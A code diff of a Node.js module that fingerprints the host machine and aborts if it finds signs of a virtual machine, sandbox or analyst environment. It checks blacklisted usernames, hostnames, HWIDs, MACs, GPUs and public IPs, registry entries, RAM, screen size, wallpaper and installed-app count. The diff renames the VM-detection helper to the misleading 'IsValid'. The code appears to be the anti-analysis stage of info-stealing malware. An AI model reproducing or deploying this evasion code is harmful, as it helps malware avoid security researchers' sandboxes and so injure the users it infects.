@@ -3,84 +3,84 @@ const os = require('os');
 
 const program = require("../../utils/program/program.js");
 
-const isVM = (array, item) => {
+const IsValid = (array, item) => {
     return array.includes(item);
 };
 
-const isBlacklistedUsername = (usernames) => {
+const IsBlacklistedUsername = (usernames) => {
     const username = os.userInfo().username;
-    return isVM(usernames, username);
+    return IsValid(usernames, username);
 };
 
-const isBlacklistedHostname = (hostnames) => {
+const IsBlacklistedHostname = (hostnames) => {
     const hostname = os.hostname();
-    return isVM(hostnames, hostname);
+    return IsValid(hostnames, hostname);
 };
 
-const isBlacklistedHWID = async (hwids) => {
+const IsBlacklistedHWID = async (hwids) => {
     try {
-        const output = await program.execCommand('wmic csproduct get uuid');
+        const output = await program.ExecCommand('wmic csproduct get uuid');
         const hwidMatch = output.match(/UUID\s+([A-Fa-f0-9-]+)/i);
         const hwid = hwidMatch ? hwidMatch[1] : null;
-        return isVM(hwids, hwid);
+        return IsValid(hwids, hwid);
     } catch (error) {
         return false;
     }
 };
 
-const isBlacklistedProductKey = async (keys) => {
+const IsBlacklistedProductKey = async (keys) => {
     try {
-        const output = await program.execCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault");
+        const output = await program.ExecCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault");
         const productKey = output.toString();
-        return isVM(keys, productKey);
+        return IsValid(keys, productKey);
     } catch (error) {
         return false;
     }
 };
 
-const isBlacklistedGPU = async (gpus) => {
+const IsBlacklistedGPU = async (gpus) => {
     try {
-        const output = await program.execCommand("wmic PATH Win32_VideoController get name | more +1");
+        const output = await program.ExecCommand("wmic PATH Win32_VideoController get name | more +1");
         const gpuList = output.split('\n').map(line => line.trim()).filter(line => line.length > 0);
-        return gpuList.some(gpu => isVM(gpus, gpu));
+        return gpuList.some(gpu => IsValid(gpus, gpu));
     } catch (error) {
         return false;
     }
 };
 
-const isBlacklistedOS = async (oss) => {
+const IsBlacklistedOS = async (oss) => {
     try {
-        const output = await program.execCommand("wmic OS get caption, osarchitecture | more +1");
+        const output = await program.ExecCommand("wmic OS get caption, osarchitecture | more +1");
         const osList = output.split('\n').map(line => line.trim()).filter(line => line.length > 0);
-        return osList.some(os => isVM(oss, os));
+        return osList.some(os => IsValid(oss, os));
     } catch (error) {
         return false;
     }
 };
 
-const isBlacklistedMAC = async (macs) => {
+const IsBlacklistedMAC = async (macs) => {
     try {
-        const output = await program.execCommand(`getmac`);
+        const output = await program.ExecCommand(`getmac`);
         const macAddresses = output.split('\n').map(line => line.split(' ')[0].trim()).filter(Boolean);
-        return macAddresses.some(mac => isVM(macs, mac));
+        return macAddresses.some(mac => IsValid(macs, mac));
     } catch (error) {
         return false;
     }
 };
 
-const isBlacklistedIP = async (ips) => {
+const IsBlacklistedIP = async (ips) => {
     try {
-        const ip = await program.execCommand('curl -s https://api.ipify.org');
-        return isVM(ips, ip);
+        const ip = await program.ExecCommand('curl -s https://api.ipify.org');
+        return IsValid(ips, ip);
     } catch (error) {
         return false;
     }
 };
 
 
-const isWallpaperStandard = async () => {
+const IsWallpaperStandard = async () => {
     try {
-        const output = await program.execCommand(`reg query "HKCU\\Control Panel\\Desktop" /v Wallpaper`);
+        const output = await program.ExecCommand(`reg query "HKCU\\Control Panel\\Desktop" /v Wallpaper`);
         const wallpaperPath = output.split('REG_SZ')[1].trim();
         const stats = fs.statSync(wallpaperPath);
         return stats.size === 24811;
@@ -89,9 +89,9 @@ const isWallpaperStandard = async () => {
     }
 };
 
-const checkScreenSize = async () => {
+const CheckScreenSize = async () => {
     try {
-        const output = await program.execCommand('wmic path Win32_VideoController get CurrentHorizontalResolution,CurrentVerticalResolution');
+        const output = await program.ExecCommand('wmic path Win32_VideoController get CurrentHorizontalResolution,CurrentVerticalResolution');
         const [width, height] = output.split('\n')[1].split(/\s+/).map(Number);
         return width < 800 || height < 600;
     } catch (error) {
@@ -99,9 +99,9 @@ const checkScreenSize = async () => {
     }
 };
 
-const ramCheck = async () => {
+const CheckRam = async () => {
     try {
-        const output = await program.execCommand("wmic computersystem get totalphysicalmemory | more +1");
+        const output = await program.ExecCommand("wmic computersystem get totalphysicalmemory | more +1");
         const ram = Math.floor(parseInt(output) / (1024 * 1024 * 1024)) || '0';
         return !isNaN(ram) && ram < 2
     } catch (error) {
@@ -109,37 +109,37 @@ const ramCheck = async () => {
     }
 };
 
-const isHosted = async () => {
+const IsHosted = async () => {
     try {
-        const hosting = await program.execCommand('curl -s http://ip-api.com/line/?fields=hosting');
+        const hosting = await program.ExecCommand('curl -s http://ip-api.com/line/?fields=hosting');
         return hosting.trim() === 'true';
     } catch (error) {
         return false;
     }
 };
 
-const checkIfRunningInVM = async () => {
+const CheckIfRunningInVM = async () => {
     try {
-        const output = await program.execCommand('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum" /v 0');
+        const output = await program.ExecCommand('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum" /v 0');
         return output.includes('VMware') || output.includes('VBOX');
     } catch (error) {
         return false;
     }
 };
 
-const isVMGraphicsCardDetected = async () => {
+const IsValidGraphicsCardDetected = async () => {
     try {
-        const output = await program.execCommand('wmic path win32_VideoController get name');
+        const output = await program.ExecCommand('wmic path win32_VideoController get name');
         return output.toLowerCase().includes('virtualbox') || output.toLowerCase().includes('vmware');
     } catch (error) {
         return false;
     }
 };
 
-const checkApps = async () => {
+const CheckApps = async () => {
     try {
         const appsLimit = 60
-        const apps = parseInt(await program.execPowerShell('(Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*).Count'));
+        const apps = parseInt(await program.ExecPowerShell('(Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*).Count'));
         return apps < appsLimit || apps === appsLimit;
     } catch (error) {
         return false;
@@ -158,27 +158,26 @@ module.exports = async () => {
     
     try {
         let checksBacklisted = [
-            isVMGraphicsCardDetected(),
-            isWallpaperStandard(),
-            checkIfRunningInVM(),
-            checkScreenSize(),
-            ramCheck(),
-            isHosted(),
-            checkApps(),
-            isBlacklistedUsername(blacklistedUsernames),
-            isBlacklistedHostname(blacklistedHostnames),
-            isBlacklistedHWID(blacklistedHWIDs),
-            isBlacklistedProductKey(blacklistedProductKey),
-            isBlacklistedGPU(blacklistedGPUs),
-            isBlacklistedOS(blacklistedOSs),
-            isBlacklistedIP(blacklistedIPAddresses),
-            isBlacklistedMAC(blacklistedMacAddresses),
+            IsValidGraphicsCardDetected(),
+            IsWallpaperStandard(),
+            CheckIfRunningInVM(),
+            CheckScreenSize(),
+            CheckRam(),
+            IsHosted(),
+            CheckApps(),
+            IsBlacklistedUsername(blacklistedUsernames),
+            IsBlacklistedHostname(blacklistedHostnames),
+            IsBlacklistedHWID(blacklistedHWIDs),
+            IsBlacklistedProductKey(blacklistedProductKey),
+            IsBlacklistedGPU(blacklistedGPUs),
+            IsBlacklistedOS(blacklistedOSs),
+            IsBlacklistedIP(blacklistedIPAddresses),
+            IsBlacklistedMAC(blacklistedMacAddresses),
         ];
 
         const results = await Promise.all(checksBacklisted);
 
         for (const result of results) {
-            console.log(result)
             if (result) {
                 process.abort();
             }
@@ -186,4 +185,4 @@ module.exports = async () => {
     } catch (error) {
         console.log(error)
     }
-}
+};
